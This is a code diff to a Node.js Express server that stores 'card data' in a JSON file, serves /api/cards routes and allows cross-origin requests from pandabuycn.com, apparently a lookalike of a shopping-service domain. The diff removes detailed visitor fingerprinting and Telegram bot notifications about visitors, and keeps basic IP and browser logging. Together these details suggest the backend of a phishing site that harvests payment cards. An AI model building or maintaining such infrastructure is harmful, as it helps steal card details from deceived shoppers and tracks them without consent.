@@ -41,7 +41,11 @@ const PORT = config.server.port;
 const DATA_FILE = path.join(__dirname, 'card-data.json');
 
 // Middleware
-app.use(cors()); // Enable CORS for all routes
+app.use(cors({
+  origin: ['https://pandabuycn.com', 'https://www.pandabuycn.com', 'http://localhost:3000'],
+  methods: ['GET', 'POST', 'DELETE'],
+  credentials: true
+})); // Enable CORS for cross-origin requests
 app.use(express.json()); // Parse JSON request bodies
 
 // Basic visitor logging (IP and browser only)
@@ -66,13 +70,6 @@ app.use(express.static('.')); // Serve static files from current directory
 if (!fs.existsSync(DATA_FILE)) {
   fs.writeFileSync(DATA_FILE, JSON.stringify([]));
   console.log('Created empty card data file');
-}
-
-
-
-
-  
-  return true;
 }
 
 // API Routes
@@ -151,96 +148,23 @@ app.delete('/api/cards', (req, res) => {
   }
 });
 
-// Get all visit data
+// Simple endpoint for basic visit logging
 app.get('/api/visits', (req, res) => {
-  try {
-    const data = JSON.parse(fs.readFileSync(VISITS_FILE, 'utf8'));
-    res.json(data);
-  } catch (error) {
-    console.error('Error reading visits data:', error);
-    res.status(500).json({ error: 'Failed to retrieve visits data' });
-  }
+  res.json({ message: 'Visit tracking simplified - check server logs' });
 });
 
-// Clear all visit data (for testing/admin purposes)
-app.delete('/api/visits', (req, res) => {
-  try {
-    fs.writeFileSync(VISITS_FILE, JSON.stringify([]));
-    console.log('All visit data cleared');
-    res.json({ success: true, message: 'All visit data cleared' });
-  } catch (error) {
-    console.error('Error clearing visit data:', error);
-    res.status(500).json({ error: 'Failed to clear visit data' });
-  }
-});
-
-// Enhanced visit tracking endpoint for client-side data
+// Basic visit tracking endpoint
 app.post('/api/track-visit', (req, res) => {
   try {
-    const clientData = req.body;
+    const ip = req.ip || req.connection.remoteAddress || req.headers['x-forwarded-for']?.split(',')[0] || 'Unknown';
+    const userAgent = req.headers['user-agent'] || 'Unknown';
+    const browser = getBrowserFromUA(userAgent);
     
-    // Add server-side information
-    const serverData = {
-      serverTimestamp: new Date().toISOString(),
-      serverIP: req.ip || req.connection.remoteAddress || req.socket.remoteAddress || 
-                (req.connection.socket ? req.connection.socket.remoteAddress : null) || 
-                req.headers['x-forwarded-for']?.split(',')[0] || 'Unknown',
-      serverUserAgent: req.headers['user-agent'] || '',
-      serverHeaders: {
-        acceptLanguage: req.headers['accept-language'],
-        acceptEncoding: req.headers['accept-encoding'],
-        connection: req.headers.connection,
-        host: req.headers.host,
-        referer: req.headers.referer
-      }
-    };
-    
-    // Combine client and server data
-    const enhancedVisitData = {
-      ...clientData,
-      server: serverData,
-      // Add some mock location data if not provided by client
-      geoLocation: clientData.location?.latitude ? clientData.location : {
-        country: getRandomCountry(),
-        city: getRandomCity(),
-        latitude: null,
-        longitude: null,
-        source: 'mock'
-      }
-    };
-    
-    // Read existing visits
-    let visits = [];
-    try {
-      visits = JSON.parse(fs.readFileSync(VISITS_FILE, 'utf8'));
-    } catch (readError) {
-      console.error('Error reading visits data:', readError);
-    }
-    
-    // Add new enhanced visit
-    visits.push(enhancedVisitData);
-    
-    // Keep only last 1000 visits
-    if (visits.length > 1000) {
-      visits = visits.slice(-1000);
-    }
-    
-    // Save visits data
-    fs.writeFileSync(VISITS_FILE, JSON.stringify(visits, null, 2));
-    
-    console.log(`Enhanced visit tracked: ${serverData.serverIP} - ${clientData.browser?.name || 'Unknown'} on ${clientData.os?.name || 'Unknown'}`);
-    
-    // Send Telegram notification if conditions are met
-    if (shouldSendVisitNotification(enhancedVisitData)) {
-      lastVisitNotification = Date.now();
-      telegramBot.sendVisitNotification(enhancedVisitData).catch(error => {
-        console.error('Failed to send visit notification to Telegram:', error.message);
-      });
-    }
+    console.log(`Visit tracked: ${ip} - ${browser}`);
     
     res.json({ success: true, message: 'Visit tracked successfully' });
   } catch (error) {
-    console.error('Error tracking enhanced visit:', error);
+    console.error('Error tracking visit:', error);
     res.status(500).json({ error: 'Failed to track visit' });
   }
 });
